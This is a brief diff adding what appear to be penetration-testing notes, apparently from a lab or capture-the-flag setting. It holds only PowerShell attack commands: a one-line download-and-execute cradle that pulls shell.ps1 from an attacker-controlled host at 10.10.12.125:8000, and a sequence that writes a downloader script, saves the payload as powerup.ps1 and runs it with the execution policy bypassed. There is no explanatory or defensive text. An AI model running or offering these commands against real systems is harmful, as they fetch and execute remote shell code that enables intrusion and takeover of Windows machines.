@@ -1,0 +1,11 @@
+
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.12.125:8000/shell.ps1')"
+
+
+Powershell
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://10.10.12.125:8000/shell.ps1" >>wget.ps1
+echo $file = "powerup.ps1" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
